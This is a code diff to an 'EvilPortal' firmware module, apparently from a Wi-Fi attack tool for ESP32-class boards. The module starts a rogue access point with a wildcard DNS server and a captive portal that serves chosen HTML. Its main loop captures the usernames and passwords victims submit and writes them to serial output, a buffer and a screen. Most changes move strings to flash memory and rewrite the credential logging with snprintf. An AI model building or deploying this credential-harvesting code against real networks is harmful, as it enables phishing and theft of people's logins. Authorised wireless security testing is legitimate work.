@@ -61,9 +61,9 @@ void EvilPortal::setupServer() {
   #ifndef HAS_PSRAM
     server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
       request->send_P(200, "text/html", index_html);
-      Serial.println("client connected");
+      Serial.println(F("client connected"));
       #ifdef HAS_SCREEN
-        this->sendToDisplay("Client connected to server");
+        this->sendToDisplay(F("Client connected to server"));
       #endif
     });
   #else
@@ -71,7 +71,7 @@ void EvilPortal::setupServer() {
       request->send(200, "text/html", index_html);
       Serial.println("client connected");
       #ifdef HAS_SCREEN
-        this->sendToDisplay("Client connected to server");
+        this->sendToDisplay(F("Client connected to server"));
       #endif
     });
   #endif
@@ -144,10 +144,10 @@ void EvilPortal::setHtmlFromSerial() {
 
 bool EvilPortal::setHtml() {
   if (this->using_serial_html) {
-    Serial.println("html previously set");
+    Serial.println(F("html previously set"));
     return true;
   }
-  Serial.println("Setting HTML...");
+  Serial.println(F("Setting HTML..."));
   #ifdef HAS_SD
     File html_file = sd_obj.getFile("/" + this->target_html_name);
   #else
@@ -156,7 +156,7 @@ bool EvilPortal::setHtml() {
   if (!html_file) {
     #ifdef HAS_SCREEN
       this->sendToDisplay("Could not find /" + this->target_html_name);
-      this->sendToDisplay("Touch to exit...");
+      this->sendToDisplay(F("Touch to exit..."));
     #endif
     Serial.println("Could not find /" + this->target_html_name + ". Use stopscan...");
     return false;
@@ -164,9 +164,9 @@ bool EvilPortal::setHtml() {
   else {
     if (html_file.size() > MAX_HTML_SIZE) {
       #ifdef HAS_SCREEN
-        this->sendToDisplay("The given HTML is too large.");
+        this->sendToDisplay(F("The given HTML is too large."));
         this->sendToDisplay("The Byte limit is " + (String)MAX_HTML_SIZE);
-        this->sendToDisplay("Touch to exit...");
+        this->sendToDisplay(F("Touch to exit..."));
       #endif
       Serial.println("The provided HTML is too large. Byte limit is " + (String)MAX_HTML_SIZE + "\nUse stopscan...");
       return false;
@@ -316,14 +316,14 @@ bool EvilPortal::setAP(String essid) {
 
   strncpy(apName, essid.c_str(), MAX_AP_NAME_SIZE);
   this->has_ap = true;
-  Serial.println("ap config set");
+  Serial.println(F("ap config set"));
   return true;
 }
 
 void EvilPortal::startAP() {
   const IPAddress AP_IP(172, 0, 0, 1);
 
-  Serial.print("starting ap ");
+  Serial.print(F("starting ap "));
   Serial.println(apName);
 
   WiFi.mode(WIFI_AP);
@@ -334,19 +334,19 @@ void EvilPortal::startAP() {
     this->sendToDisplay("AP started");
   #endif
 
-  Serial.print("ap ip address: ");
+  Serial.print(F("ap ip address: "));
   Serial.println(WiFi.softAPIP());
 
   this->setupServer();
 
-  Serial.println("Server endpoints configured");
+  Serial.println(F("Server endpoints configured"));
 
   this->dnsServer.start(53, "*", WiFi.softAPIP());
-  Serial.println("DNS Server started");
+  Serial.println(F("DNS Server started"));
   server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
-  Serial.println("Captive Portal handler started");
+  Serial.println(F("Captive Portal handler started"));
   server.begin();
-  Serial.println("Server started");
+  Serial.println(F("Server started"));
   #ifdef HAS_SCREEN
     this->sendToDisplay("Evil Portal READY");
   #endif
@@ -375,20 +375,29 @@ void EvilPortal::sendToDisplay(String msg) {
 }
 
 void EvilPortal::main(uint8_t scan_mode) {
-  if ((scan_mode == WIFI_SCAN_EVIL_PORTAL) && (this->has_ap) && (this->has_html)){
-    this->dnsServer.processNextRequest();
-    if (this->name_received && this->password_received) {
-      this->name_received = false;
-      this->password_received = false;
-      String logValue1 =
-          "u: " + this->user_name;
-      String logValue2 = "p: " + this->password;
-      String full_string = logValue1 + " " + logValue2 + "\n";
-      Serial.print(full_string);
-      buffer_obj.append(full_string);
-      #ifdef HAS_SCREEN
-        this->sendToDisplay(full_string);
-      #endif
-    }
+  if (scan_mode != WIFI_SCAN_EVIL_PORTAL || !this->has_ap || !this->has_html) {
+    return;
+  }
+
+  this->dnsServer.processNextRequest();
+
+  if (this->name_received && this->password_received) {
+    this->name_received = false;
+    this->password_received = false;
+
+    // Adjust size depending on your max username/password length
+    char line[96];
+
+    // If user_name / password are still Arduino String:
+    snprintf(line, sizeof(line),
+             "u: %s p: %s\n",
+             this->user_name.c_str(),
+             this->password.c_str());
+
+    Serial.print(line);
+    buffer_obj.append(line);
+    #ifdef HAS_SCREEN
+        this->sendToDisplay(line);
+    #endif
   }
 }
